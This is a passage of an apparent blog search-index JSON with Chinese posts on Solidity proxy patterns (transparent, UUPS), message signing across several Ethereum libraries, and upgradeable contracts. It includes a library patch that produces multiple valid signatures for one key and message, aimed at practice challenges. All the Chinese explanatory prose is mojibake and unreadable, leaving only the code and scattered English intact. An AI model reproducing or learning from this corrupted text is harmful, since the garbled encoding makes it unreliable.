await provider.getStorage(address, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbcn); console.log(`implementation = $&#123;implementation&#125;`);&#125;await print(); 3.3 ç¼ºé™· è¿™ç§ä»£ç†æ¨¡å¼è§£å†³äº†æ’æ§½å†²çªé—®é¢˜ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è§£å†³é€‰æ‹©å™¨å†²çªé—®é¢˜ã€‚ å®‰å…¨æ€§è¾ƒä½ã€‚ 4. é€æ˜ä»£ç†EIP-1967 é€æ˜åˆçº¦æ ‡å‡† è¯¥ä»£ç†æ¨¡å¼æ—¨åœ¨è§£å†³é€‰æ‹©å™¨å†²çªé—®é¢˜ï¼Œé€šå¸¸é…åˆEIP1967ä½¿ç”¨ï¼Œè™½ç„¶è¢«å¼ƒç”¨äº†ï¼Œä½†æ˜¯è¿˜æ˜¯å€¼å¾—å­¦ä¹ çš„ã€‚ é€æ˜ä»£ç†æ¨¡å¼çš„é€»è¾‘æ˜¯ï¼šç®¡ç†å‘˜å¯èƒ½ä¼šå› ä¸ºâ€œå‡½æ•°é€‰æ‹©å™¨å†²çªâ€ï¼Œåœ¨è°ƒç”¨é€»è¾‘åˆçº¦çš„å‡½æ•°æ—¶ï¼Œè¯¯è°ƒç”¨ä»£ç†åˆçº¦çš„å¯å‡çº§å‡½æ•°ã€‚é‚£ä¹ˆé™åˆ¶ç®¡ç†å‘˜çš„æƒé™ï¼Œä¸è®©ä»–è°ƒç”¨ä»»ä½•é€»è¾‘åˆçº¦çš„å‡½æ•°ï¼Œå°±èƒ½è§£å†³å†²çªã€‚ ç®¡ç†å‘˜å˜æˆå·¥å…·äººï¼Œä»…èƒ½è°ƒç”¨ä»£ç†åˆçº¦å’Œå¯å‡çº§å‡½æ•°å¯¹åˆçº¦å‡çº§ï¼Œä¸èƒ½é€šè¿‡å›è°ƒå‡½æ•°è°ƒç”¨é€»è¾‘åˆçº¦ã€‚ éç®¡ç†å‘˜ç”¨æˆ·ä¸èƒ½è°ƒç”¨å‡çº§åˆçº¦å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å›è°ƒå‡½æ•°è°ƒç”¨é€»è¾‘åˆçº¦ã€‚ 4.1 å¤ç°æ ¹æ®ä¸Šè¿°è¦æ±‚ï¼Œä»£ç†åˆçº¦çš„å®ç°å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223contract TransparentProxy &#123; address implementation; // logic address admin; string public words; constructor(address _implementation)&#123; admin = msg.sender; implementation = _implementation; &#125; // fallbackå‡½æ•°ï¼Œå°†è°ƒç”¨å§”æ‰˜ç»™é€»è¾‘åˆçº¦ // ä¸èƒ½è¢«adminè°ƒç”¨ï¼Œé¿å…é€‰æ‹©å™¨å†²çªå¼•å‘æ„å¤– fallback() external payable &#123; require(msg.sender != admin); (bool success, bytes memory data) = implementation.delegatecall(msg.data); &#125; // å‡çº§å‡½æ•°ï¼Œæ”¹å˜é€»è¾‘åˆçº¦åœ°å€ï¼Œåªèƒ½ç”±adminè°ƒç”¨ function upgrade(address newImplementation) external &#123; if (msg.sender != admin) revert(); implementation = newImplementation; &#125;&#125; è¿™æ ·å°±å¯ä»¥ç®€å•çš„å®ç° å‡çº§å‡½æ•°åªèƒ½ç”±ç®¡ç†å‘˜è°ƒç”¨ï¼Œå›è°ƒå‡½æ•°ä¸èƒ½ç”±ç®¡ç†å‘˜è°ƒç”¨ã€‚ 4.2 ç¼ºé™· é‡‡ç”¨EIP1967çš„å­˜å‚¨æ–¹å¼ï¼Œæ¯ä¸€æ¬¡è°ƒç”¨éƒ½éœ€è¦sloadè¯»å–ç®¡ç†å‘˜æ’æ§½ï¼Œæ¶ˆè€—çš„gasæˆæœ¬é«˜ã€‚ 5. é€šç”¨å¯å‡çº§ä»£ç† - UUPSUUPS é€šç”¨å¯å‡çº§ä»£ç† æ¥è‡ª EIP1822ï¼Œè¯¥ä»£ç†æ¨¡å¼æ˜¯é‡‡ç”¨ä¼ªéšæœºçš„å­˜å‚¨æ§½å­˜å‚¨é€»è¾‘åˆçº¦åœ°å€ï¼Œå…¶å®ä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯EIP1967çš„å‰ç”Ÿï¼Œåè€…å°†å­˜å‚¨æ§½è¿›è¡Œäº†è§„èŒƒåŒ–ã€‚ åœ¨EIP1822ä¸­ï¼Œé€»è¾‘åˆçº¦çš„åœ°å€å­˜å‚¨ä½ç½®ä¸ºï¼š 1keccak256(&quot;PROXIABLE&quot;) = 0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7 ç”±äºè®¡ç®—ç»“æœæ•°å€¼å¾ˆå¤§ï¼Œè¿™ä¹Ÿå°±æ¶ˆé™¤äº†ä»£ç†å’Œé€»è¾‘åˆçº¦ä¸­å˜é‡ä¹‹é—´å‘ç”Ÿå†²çªçš„å¯èƒ½æ€§ã€‚ é™¤æ­¤ä¹‹å¤–ï¼ŒUUPSè¿˜è§£å†³äº†é€‰æ‹©å™¨å†²çªé—®é¢˜ï¼Œå®ƒé‡‡ç”¨çš„æ–¹å¼æ˜¯ï¼šå°†å‡çº§å‡½æ•°ç¼–å†™äºé€»è¾‘åˆçº¦ä¸­è€Œä¸æ˜¯ä»£ç†åˆçº¦ä¸­ï¼Œè¿™æ ·ä¸€æ¥å°±å¯ä»¥ç›´æ¥é¿å…äº†é€»è¾‘åˆçº¦ä¸­çš„æŸä¸ªå‡½æ•°çš„å‡½æ•°é€‰æ‹©å™¨å’Œå‡çº§å‡½æ•°çš„é€‰æ‹©å™¨ç›¸åŒï¼Œå³ä½¿æ˜¯å¼€å‘è€…ä¸ç»æ„é—´å†™å‡ºæ¥äº†ï¼Œç¼–è¯‘å™¨ä¹Ÿä¼šæŠ¥é”™ï¼Œä»è€Œå¾ˆå·§å¦™çš„è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"proxy","slug":"DEFI/proxy","permalink":"https://biyouqiuqiu.com/categories/DEFI/proxy/"}],"tags":[{"name":"Upgradeable","slug":"Upgradeable","permalink":"https://biyouqiuqiu.com/tags/Upgradeable/"}]},{"title":"sign a message","slug":"Utils/Solidity/sign_a_message","date":"2024-01-21T04:47:10.000Z","updated":"2024-01-21T04:47:10.000Z","comments":true,"path":"2024/01/21/Utils/Solidity/sign_a_message/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/21/Utils/Solidity/sign_a_message/","excerpt":"","text":"å‰è¨€ ğŸ“Œé¶åœºåˆ·é¢˜é‡å¾—åˆ°å¾ˆå¤šå…³äºéªŒè¯ç­¾åçš„é¢˜ï¼Œåœ¨è¿™é‡Œæ±‡æ€»ä¸€ä¸‹ï¼Œæ¶ˆæ¯ç­¾åçš„å·¥å…·å’Œæ–¹æ³•ã€‚ 1. é‡‡ç”¨ web3.py1.1 é€‚ç”¨äºæœ¬åœ°æµ‹è¯• è¿™æ˜¯ä¸ç¬¦åˆå½“å‰ ä»¥å¤ªåŠ è§„å®šçš„ç­¾åï¼Œå³æœªåŠ å…¥\\x19Ethereum Signed Message:\\n32ï¼Œ é€‚åˆç”¨äºå¹³æ—¶åœ¨æœ¬åœ°å¤ç°é¶åœºçš„ç®€å•ä½¿ç”¨ã€‚ 12345678910111213141516### è¿™æ˜¯æ²¡åŠ  \\x19Ethereum Signed Message:\\n32from eth_account import Accountfrom web3 import Web3message = &quot;&quot;privatekey = &quot;&quot;messagehash = Web3.keccak(text=message)signMessage = Account.signHash(message_hash=messagehash, private_key=privatekey)print(&quot;message =&quot;, message)print(&quot;message&#x27;s hash =&quot;,messagehash.hex())print(&quot;v =&quot;, Web3.to_hex(signMessage.v))print(&quot;r =&quot;, Web3.to_hex(signMessage.r))print(&quot;s =&quot;, Web3.to_hex(signMessage.s))print(&quot;signature =&quot;, Web3.to_hex(signMessage.signature)) 1.2 é€‚ç”¨äºæµ‹è¯•ç½‘ å¦‚ä¸‹æ˜¯éµå¾ªEIP191åè®®çš„ç­¾åè§„åˆ™çš„ä»£ç ï¼Œå³åŠ å…¥\\x19Ethereum Signed Message:\\n32ã€‚ å¦‚ä¸‹è¿™ä¸¤ç§æ–¹æ³•å’Œmetamaskçš„ç­¾åç»“æœä¸€æ ·ã€‚ ä½†æ˜¯å¦‚ä¸‹è¿™é‡Œä¸ªå¹¶ä¸æ˜¯æŒ‰ç…§å¦‚ä¸‹çš„è®¡ç®—æ–¹å¼ï¼š 12bytes memory prefix = &quot;\\x19Ethereum Signed Message:\\n32&quot;;bytes32 result = keccak256(abi.encodePacked(prefix, hash)); 1234567891011121314# åŠ å…¥äº† \\x19Ethereum Signed Message:\\n32from web3.auto import w3from eth_account.messages import encode_defunctmsg = &quot;&quot;private_key = &quot;&quot;message = encode_defunct(text=msg)signed_message = w3.eth.account.sign_message(message, private_key=private_key)print(&quot;message =&quot;, msg)print(&quot;messageHash =&quot;, w3.to_hex(signed_message.messageHash))print(&quot;r =&quot;, w3.to_hex(signed_message.r))print(&quot;s =&quot;, w3.to_hex(signed_message.s))print(&quot;v =&quot;, w3.to_hex(signed_message.v))print(&quot;signature =&quot;, w3.to_hex(signed_message.signature)) æˆ– 1234567891011121314151617181920212223from web3 import Web3, HTTPProviderfrom eth_account.messages import encode_defunct# ç§é’¥private_key = &quot;&quot;rpc = &#x27;https://rpc.ankr.com/eth&#x27; # éµä»ä¸»ç½‘è§„åˆ™w3 = Web3(HTTPProvider(rpc))msg = &quot;&quot;#æ„é€ å¯ç­¾åä¿¡æ¯message = encode_defunct(text=msg)# signsigned_message = w3.eth.account.sign_message(message, private_key=private_key)print(&quot;msg =&quot;, msg)print(&quot;msgHash =&quot;, w3.to_hex(signed_message.messageHash))print(&quot;r =&quot;, w3.to_hex(signed_message.r))print(&quot;s =&quot;, w3.to_hex(signed_message.s))print(&quot;v =&quot;, w3.to_hex(signed_message.v))print(&quot;signature = &quot;, w3.to_hex(signed_message.signature)) ä»£ç ç»“æœè¿è¡Œå›¾ï¼š metamaskç­¾åç»“æœå›¾ï¼š 2. é‡‡ç”¨web3.js web3.jsçš„ç‰ˆæœ¬ä¸ºï¼š&quot;version&quot;: &quot;1.8.0&quot; è¿™ä¸ªæ–¹æ³•å°±å¾ˆç‰›çš®äº†ï¼š å¦‚æœè¾“å…¥çš„dataæ˜¯stringç±»å‹çš„ï¼šé‚£ä¹ˆtaçš„è¿ç®—ç»“æœå’Œmetamaskçš„ç»“æœä¸€æ · å¦‚æœè¾“å…¥çš„dataæ˜¯hashï¼šé‚£ä¹ˆtaçš„å¤„ç†æ–¹å¼å°±æ˜¯å¦‚ä¸‹ 12bytes memory prefix = &quot;\\x19Ethereum Signed Message:\\n32&quot;;bytes32 result = keccak256(abi.encodePacked(prefix, hash)); remixä»£ç ç»“æœï¼š web3jsä»£ç ç»“æœï¼š ä»£ç ï¼š 123456789var Web3 = require(&#x27;web3&#x27;);var web3 = new Web3(Web3.givenProvider);let dataHash = &quot;&quot;;let privateKey = &quot;&quot;let sign = web3.eth.accounts.sign(dataHash, privateKey);console.log(sign); 3. é‡‡ç”¨ ethers.js ç‰ˆæœ¬ä¸ºï¼š^6.2.3ã€‚ è¯¥è„šæœ¬çš„ç­¾åç»“æœå’Œæ–¹å¼å’Œmetamaskä¹Ÿæ˜¯ä¸€æ ·,éµå¾ªEIP191ï¼Œä¸ä¼šåƒweb3jsé‚£æ ·ï¼Œè¾“å…¥ä¸ºhashæ—¶ï¼Œä¸éµå®ˆ 12bytes memory prefix = &quot;\\x19Ethereum Signed Message:\\n32&quot;;bytes32 result = keccak256(abi.encodePacked(prefix, hash)); 12345678910111213141516import &#123; ethers &#125; from &quot;ethers&quot;;const RPC = &quot;&quot;;const provider = new ethers.JsonRpcProvider(RPC);const privateKey = &quot;&quot;;const wallet = new ethers.Wallet(privateKey, provider);const message = &quot;&quot;;const messageHash = ethers.hashMessage(message);const signature = await wallet.signMessage(message);console.log(`message = $&#123;messageHash&#125;`);console.log(`signatrue = $&#123;signature&#125;`); 4. é‡‡ç”¨ethereum.js è¿™æ˜¯æœªéµå¾ªEIP191åè®®çš„ç­¾åæ–¹å¼ 12345678910111213141516171819202122232425const ethereumjsUtil = require(&#x27;ethereumjs-util&#x27;);// è¦ç­¾åçš„æ¶ˆæ¯const message = &#x27;stage1&#x27;;// ç§é’¥ï¼ˆæ³¨æ„ï¼šè¿™åªæ˜¯ä¸€ä¸ªç¤ºä¾‹ç§é’¥ï¼Œä¸åº”è¯¥åœ¨å®é™…é¡¹ç›®ä¸­ä½¿ç”¨ï¼‰const privateKey = Buffer.from(&#x27;0000000000000000000000000000000000000000000000000000000000000001&#x27;, &#x27;hex&#x27;);// ç”Ÿæˆæ¶ˆæ¯çš„ Keccak-256 å“ˆå¸Œlet buffer_message = Buffer.from(message); // å°†messageè½¬æˆå­—èŠ‚æµconst messageHash = ethereumjsUtil.keccak256(buffer_message);// ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯å“ˆå¸Œè¿›è¡Œç­¾åconst signature = ethereumjsUtil.ecsign(messageHash, privateKey);// å°†ç­¾åç»“æœè¿›è¡Œæ ¼å¼åŒ–const formattedSignature = &#123; v: signature.v, r: signature.r.toString(&#x27;hex&#x27;), s: signature.s.toString(&#x27;hex&#x27;)&#125;;console.log(&#x27;Message:&#x27;, message);console.log(&#x27;Message Hash:&#x27;, messageHash.toString(&#x27;hex&#x27;));console.log(&#x27;Signature:&#x27;, formattedSignature); 5. ç­¾åå’Œæ¶ˆæ¯è¿˜åŸåœ°å€1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol&quot;;contract SignMessage &#123; using ECDSA for bytes32; function verifyMessage(string memory message, bytes memory signature) public view returns(address, bool) &#123; //hash the plain text message bytes32 messagehash = keccak256(bytes(message)); address signeraddress = messagehash.recover(signature); if (msg.sender==signeraddress) &#123; //The message is authentic return (signeraddress, true); &#125; else &#123; //msg.sender didnt sign this message. return (signeraddress, false); &#125; &#125;&#125; æˆ– 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract SignMessage &#123; // @dev ä»_msgHashå’Œç­¾å_signatureä¸­æ¢å¤signeråœ°å€ function recoverSigner(bytes32 _msgHash, bytes memory _signature) public pure returns (address)&#123; // æ£€æŸ¥ç­¾åé•¿åº¦ï¼Œ65æ˜¯æ ‡å‡†r,s,vç­¾åçš„é•¿åº¦ require(_signature.length == 65, &quot;invalid signature length&quot;); bytes32 r; bytes32 s; uint8 v; // ç›®å‰åªèƒ½ç”¨assembly (å†…è”æ±‡ç¼–)æ¥ä»ç­¾åä¸­è·å¾—r,s,vçš„å€¼ assembly &#123; /* å‰32 byteså­˜å‚¨ç­¾åçš„é•¿åº¦ (åŠ¨æ€æ•°ç»„å­˜å‚¨è§„åˆ™) add(sig, 32) = sigçš„æŒ‡é’ˆ + 32 ç­‰æ•ˆä¸ºç•¥è¿‡signatureçš„å‰32 bytes mload(p) è½½å…¥ä»å†…å­˜åœ°å€pèµ·å§‹çš„æ¥ä¸‹æ¥32 bytesæ•°æ® */ // è¯»å–é•¿åº¦æ•°æ®åçš„32 bytes r := mload(add(_signature, 0x20)) // è¯»å–ä¹‹åçš„32 bytes s := mload(add(_signature, 0x40)) // è¯»å–æœ€åä¸€ä¸ªbyte v := byte(0, mload(add(_signature, 0x60))) &#125; // ä½¿ç”¨ecrecover(å…¨å±€å‡½æ•°)ï¼šåˆ©ç”¨ msgHash å’Œ r,s,v æ¢å¤ signer åœ°å€ return ecrecover(_msgHash, v, r, s); &#125;&#125; 6. å®ç°åŒä¸€ç§é’¥ï¼ŒåŒä¸€æ¶ˆæ¯ï¼Œä¸åŒç­¾å6.1é€šè¿‡ethereum.jså®ç° è¿™éœ€è¦ä¿®æ”¹ethereum.jsçš„æºç ï¼Œç‰ˆæœ¬ä¸ºï¼š&quot;version&quot;: &quot;7.1.5&quot;ã€‚ ä¿®æ”¹ä¸€ï¼šnode_modules\\@types\\secp256k1\\index.d.ts 12// æºä»£ç noncefn?: ((message: Uint8Array, privateKey: Uint8Array, algo: Uint8Array | null, data: Uint8Array | null, attempt: number) =&gt; Uint8Array) è¿™é‡Œå¯ä»¥çœ‹åˆ°dataçš„å€¼è¢«å†™æ­»äº†ï¼Œè¢«é»˜è®¤å†™æˆnullï¼Œæ‰€ä»¥å¯¼è‡´äº†ç”Ÿæˆçš„ optionsçš„å€¼æ˜¯new Uint8Array(0)ï¼Œè¿™å°±å½±å“äº†ç”Ÿæˆçš„ç­¾åæ˜¯å”¯ä¸€çš„â€é”™è§‰â€ã€‚å¦‚ä½•å°†è¿™ä¸ªé»˜è®¤å€¼ç»™å»æ‰ï¼Œåœ¨è°ƒç”¨çš„æ—¶å€™ä¼ å…¥éšæœºçš„optionsï¼ˆé€šè¿‡ç”Ÿæˆéšæœºçš„Uint8Arrayæ•°ç»„å®ç°ï¼‰ï¼Œæ‰€ä»¥å°†è¿™é‡Œçš„ä»£ç ä¿®æ”¹ä¸º 12// å»æ‰dataçš„é»˜è®¤å€¼noncefn?: ((message: Uint8Array, privateKey: Uint8Array, algo: Uint8Array | null, data: Uint8Array, attempt: number) =&gt; Uint8Array) | undefined; ä¿®æ”¹äºŒï¼šnode_modules\\ethereumjs-util\\dist\\signature.js 12// æºç const &#123; signature, recid: recovery &#125; = (0, secp256k1_1.ecdsaSign)(msgHash, privateKey); å¯ä»¥çœ‹åˆ°è¿™é‡Œæ²¡æœ‰ä¼ å…¥optionï¼Œå³ä½¿ç”¨äº†æºç çš„é»˜è®¤optionï¼ˆnullï¼‰ï¼Œå› ä¸ºä¸Šä¸€æ­¥ä¿®æ”¹äº†optionçš„é»˜è®¤å€¼ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ä¼ å‚äº†ï¼Œå¯ä»¥å¼•å…¥cryptoåº“ï¼Œéšæœºç”ŸæˆUint8Arrayæ•°ç»„ï¼Œè¿™æ ·å°±å¯ä»¥éšæœºç”Ÿæˆç­¾åï¼Œæ‰€ä»¥å°†è¿™é‡Œçš„ä»£ç ä¿®æ”¹ä¸ºï¼š 12const crypto = require(&#x27;crypto&#x27;); // å…ˆå¯¼åº“const &#123; signature, recid: recovery &#125; = (0, secp256k1_1.ecdsaSign)(msgHash, privateKey, &#123;data:crypto.randomBytes(32)&#125;); // ç”Ÿæˆéšæœºæ•°ç»„ åœ¨ Node.js ä¸­ï¼Œcrypto.randomBytes() æ–¹æ³•æ˜¯ä¸€ä¸ªå¸¸è§çš„éšæœºæ•°ç”Ÿæˆæ–¹æ³•ã€‚ ç»¼ä¸Šï¼Œç»è¿‡ä¸¤æ¬¡ä¿®æ”¹ä¾¿å¯ä»¥å®ç°ä½¿ç”¨åŒä¸€ç§é’¥ï¼Œå¯¹åŒä¸€æ¶ˆæ¯ï¼Œè¿›è¡Œç­¾åå¯ä»¥å¾—åˆ°ä¸åŒçš„ç­¾åå€¼ ä¸¾ä¾‹ï¼š ç­¾åè„šæœ¬ï¼Œä½¿ç”¨ç§é’¥1ï¼Œå¯¹æ¶ˆæ¯stage1è¿›è¡Œç­¾å 123456789101112131415161718192021222324252627const ethereumjsUtil = require(&#x27;ethereumjs-util&#x27;);// è¦ç­¾åçš„æ¶ˆæ¯const message = &#x27;stage1&#x27;;// ç§é’¥ï¼ˆæ³¨æ„ï¼šè¿™åªæ˜¯ä¸€ä¸ªç¤ºä¾‹ç§é’¥ï¼Œä¸åº”è¯¥åœ¨å®é™…é¡¹ç›®ä¸­ä½¿ç”¨ï¼‰const privateKey = Buffer.from(&#x27;0000000000000000000000000000000000000000000000000000000000000001&#x27;, &#x27;hex&#x27;);// ç”Ÿæˆæ¶ˆæ¯çš„ Keccak-256 å“ˆå¸Œlet buffer_message = Buffer.from(message); // å°†messageè½¬æˆå­—èŠ‚æµconst messageHash = ethereumjsUtil.keccak256(buffer_message);// ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯å“ˆå¸Œè¿›è¡Œç­¾åconst signature = ethereumjsUtil.ecsign(messageHash, privateKey);// å°†ç­¾åç»“æœè¿›è¡Œæ ¼å¼åŒ–const formattedSignature = &#123;v: signature.v,r: signature.r.toString(&#x27;hex&#x27;),s: signature.s.toString(&#x27;hex&#x27;)&#125;;console.log(&#x27;Message:&#x27;, message);console.log(&#x27;Message Hash:&#x27;, messageHash.toString(&#x27;hex&#x27;));console.log(&#x27;Signature:&#x27;, formattedSignature); è¿è¡Œç»“æœï¼š å¯ä»¥ä»ç»“æœä¸­çœ‹åˆ°ï¼Œç”Ÿæˆçš„ç­¾åå€¼ä¸ä¸€æ ·ï¼Œåˆ°åˆçº¦ä¸­éªŒè¯ï¼š 12345678910// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Verify &#123; // private key = 0x1 function verify(uint8 v, bytes32 r, bytes32 s) public &#123; require(ecrecover(keccak256(&quot;stage1&quot;), v, r, s) == 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, &quot;who are you?&quot;); &#125;&#125; è¿è¡Œç»“æœï¼š ä»ç»“æœä¸­å¯ä»¥çœ‹åˆ°ï¼Œç”Ÿæˆçš„è¿™äº›ç­¾åéƒ½å¯ä»¥é€šè¿‡éªŒè¯ã€‚ 6.2 é€šè¿‡åŠ å¯†åº“å®ç° è¿™ç§æ–¹æ³•ä¸èƒ½å‡†ç¡®è·å–signatureï¼Œå› ä¸ºæœ€åçš„væ— æ³•ç¡®å®šï¼Œåªèƒ½çŒœæµ‹ï¼Œä½†æ˜¯våªèƒ½æ˜¯ 0x1b æˆ–è€… 0x1cæ‰€ä»¥çŒœå¯¹çš„å¯èƒ½æ€§ä¸º0.5ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥å®ç°ç”Ÿæˆä¸åŒç­¾åçš„åŠŸèƒ½ã€‚ 123456789101112131415161718192021222324252627282930313233const secp256k1 = require(&#x27;secp256k1&#x27;);const &#123; randomBytes &#125; = require(&#x27;crypto&#x27;);/** * * @param &#123;*&#125; numSignatures ï¼šç”Ÿæˆç­¾åæ•°é‡ * @param &#123;*&#125; PKey ï¼šç§é’¥ * @param &#123;*&#125; MessageHash ï¼šæ¶ˆæ¯çš„hashå€¼ï¼Œä¸å¸¦ `0x` * è¿™ç§æ–¹æ³•ä¸èƒ½å‡†ç¡®è·å–signatureï¼Œå› ä¸ºæœ€åçš„væ— æ³•ç¡®å®šï¼Œåªèƒ½çŒœæµ‹ï¼Œä½†æ˜¯våªèƒ½æ˜¯ 0x1b æˆ–è€… 0x1cæ‰€ä»¥çŒœå¯¹çš„å¯èƒ½æ€§ä¸º0.5 */function batchSign(numSignatures, PKey, MessageHash) &#123; const privateKey = Buffer.from(PKey, &#x27;hex&#x27;); const messageHash = Buffer.from(MessageHash, &#x27;hex&#x27;); for (let i = 0; i &lt; numSignatures; i++) &#123; const &#123; signature &#125; = secp256k1.ecdsaSign(messageHash, privateKey, &#123; data: randomBytes(32) &#125;); signatureBytes = Buffer.from(signature) signatureHex = signatureBytes.toString(&#x27;hex&#x27;); const r = signatureHex.slice(0, 64); const s = signatureHex.slice(64); console.log(`Signature $&#123;i + 1&#125;:`); console.log(&quot;Signature:&quot;,`0x$&#123;signatureHex&#125;`); // console.log(&#x27;Signature (v):&#x27;, v); console.log(&#x27;Signature (r):&#x27;, `0x$&#123;r&#125;`); console.log(&#x27;Signature (s):&#x27;, `0x$&#123;s&#125;`); console.log(&#x27;Signature (s):&#x27;,&quot;1b or 1c&quot;); console.log(&#x27;----------------------&#x27;); &#125;&#125;//testbatchSign(5, &quot;0000000000000000000000000000000000000000000000000000000000000001&quot;, &quot;8252a7072c69c0cdba0c0bc059898f7992314306b3f0845bbb76593da6b98311&quot;)","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Solidity","slug":"Utils/Solidity","permalink":"https://biyouqiuqiu.com/categories/Utils/Solidity/"}],"tags":[{"name":"signature","slug":"signature","permalink":"https://biyouqiuqiu.com/tags/signature/"}]},{"title":"Upgradeable Contract without delegatecall","slug":"DEFI/Proxy/æ·±å…¥å¯å‡çº§åˆçº¦-éä»£ç†ç¯‡","date":"2024-01-21T04:00:00.000Z","updated":"2024-01-21T04:00:00.000Z","comments":true,"path":"2024/01/21/DEFI/Proxy/æ·±å…¥å¯å‡çº§åˆçº¦-éä»£ç†ç¯‡/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/21/DEFI/Proxy/%E6%B7%B1%E5%85%A5%E5%8F%AF%E5%8D%87%E7%BA%A7%E5%90%88%E7%BA%A6-%E9%9D%9E%E4%BB%A3%E7%90%86%E7%AF%87/","excerpt":"","text":"1. å‰è¨€ solidityæ™ºèƒ½åˆçº¦éƒ¨ç½²åˆ°é“¾ä¸Šä¹‹åï¼Œä»£ç æ˜¯ä¸èƒ½å†ä¿®æ”¹çš„ï¼Œè¿™æ ·æœ‰å¥½ä¹Ÿæœ‰åã€‚ å¥½ï¼šç”¨æˆ·å¯ä»¥çŸ¥é“ä»£ç çš„è¿è¡Œé€»è¾‘ï¼Œä¸ç”¨æ‹…å¿ƒä»£ç è¢«äººç§è‡ªç¯¡æ”¹ä»è€Œæ‰§è¡Œæ¶æ„æ“ä½œï¼› åï¼šä¸€æ—¦å‘ç°ä¹‹å‰éƒ¨ç½²çš„æ™ºèƒ½åˆçº¦å‡ºç°bugï¼Œhackerå¯ä»¥åˆ©ç”¨bugæ‰§è¡Œæ¶æ„æ“ä½œï¼Œè€Œæœ¬ç€åˆçº¦ä¸å¯ç¯¡æ”¹çš„ç‰¹æ€§ï¼Œåˆçº¦ä¸èƒ½è¿›è¡Œä¿®å¤å’Œå‡çº§ï¼Œåªèƒ½é€šè¿‡é‡æ–°éƒ¨ç½²æ–°çš„åˆçº¦ï¼Œè€Œè¿™æ ·ä¸€æ¥ç”¨æˆ·çš„æ•°æ®å°†ä¼šè¢«æ¸…ç©ºï¼Œè‹¥æ˜¯è¦å®ç°æ•°æ®è¿ç§»åˆ™ä»˜å‡ºçš„gasæˆæœ¬ä¼šå¾ˆé«˜ã€‚ æ­£æ˜¯åŸºäºå¦‚ä¸Šç—›ç‚¹ï¼Œæå‡ºäº†å¯å‡çº§çš„æ™ºèƒ½åˆçº¦çš„ç†å¿µï¼Œè¯¥ç†å¿µçš„ç›®çš„æ˜¯ï¼šå®ç°æ™ºèƒ½åˆçº¦åœ¨éƒ¨ç½²ä¹‹åï¼Œè¿˜å¯ä»¥è¿›è¡Œåˆçº¦å‡çº§ã€‚ å½“ä¸‹æœ‰ä¸¤ç§ä¸»æµçš„åˆçº¦å‡çº§æ–¹å¼ï¼š æ•°æ®é€»è¾‘åˆ†ç¦» ä»£ç†æ¨¡å¼ ä»Šå¤©è¦å­¦ä¹ çš„æ˜¯é‡‡ç”¨æ•°æ®é€»è¾‘åˆ†ç¦»æ¨¡å¼å®ç°åˆçº¦å‡çº§ã€‚ 2. æ•°æ®é€»è¾‘åˆ†ç¦»æ¨¡å¼å°†æ•°æ®å’Œé€»è¾‘ä¿å­˜åœ¨ä¸åŒçš„åˆçº¦ä¸­ï¼Œé€»è¾‘åˆçº¦è´Ÿè´£è°ƒç”¨å’Œæ“ä½œæ•°æ®åˆçº¦ã€‚è¿™ç§æ–¹å¼ä¹Ÿè¢«ç§°ä¸º æ°¸ä¹…æ•°æ®å­˜å‚¨æ¨¡å¼ã€‚ 2.1 å¦‚ä½•ç†è§£å¦‚ä½•ç†è§£è¿™ç§æ¨¡å¼ï¼Ÿ æœ¬è´¨ä¸Šå°±æ˜¯ï¼šå°†é€»è¾‘åˆçº¦å’Œå­˜å‚¨æ•°æ®åˆçº¦åˆ†ç¦»æˆä¿©ä¸ªåˆçº¦ï¼Œé€»è¾‘åˆçº¦è´Ÿè´£è°ƒç”¨å­˜å‚¨æ•°æ®åˆçº¦ã€‚ æ‰§è¡Œé€»è¾‘ï¼šé€»è¾‘åˆçº¦V1é€šè¿‡callçš„æ–¹å¼å»è°ƒç”¨stroage contractï¼Œå½“åˆçº¦éœ€è¦å‡çº§çš„æ—¶å€™ï¼Œå°†V1æ›¿æ¢æˆV2ç„¶åç”¨æˆ·é€šè¿‡V2ç‰ˆæœ¬çš„é€»è¾‘åˆçº¦å»è°ƒç”¨storage contractã€‚ 2.2 ä»£ç å¤ç°å¯¹äºåˆçº¦çš„å‡çº§ä¸€å®šæ˜¯æœ‰ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶çš„ï¼Œå‡çº§æ“ä½œéœ€è¦æ·»åŠ ä¸¥æ ¼çš„æ§åˆ¶æƒï¼Œè‹¥æ˜¯anyoneéƒ½å¯ä»¥æ‰§è¡Œå‡çº§æ“ä½œï¼Œé‚£ä¹ˆåˆçº¦å¾ˆå®¹æ˜“æŠ¥åºŸï¼Œå¾…ä¼šæˆ‘ä¼šå¤ç°ã€‚ æœ¬æ¬¡å¤ç°çš„é€»è¾‘æ˜¯ï¼šstorage contractåˆçº¦æ‰€æœ‰è€…å°†åˆçº¦æ‰€æœ‰è€…æƒç§»äº¤ç»™V1ï¼ŒV1è´Ÿè´£æ“ä½œstorage contractï¼ŒåŒæ—¶å®ƒè¿˜å…·æœ‰ç§»äº¤storage contractæ‰€æœ‰æƒçš„åŠŸèƒ½ã€‚ ä»£ç å†™å¾—å¾ˆç²—ç³™ï¼Œæ—¨åœ¨å¤ç°é€»è¾‘è¿‡ç¨‹ :)ã€‚ 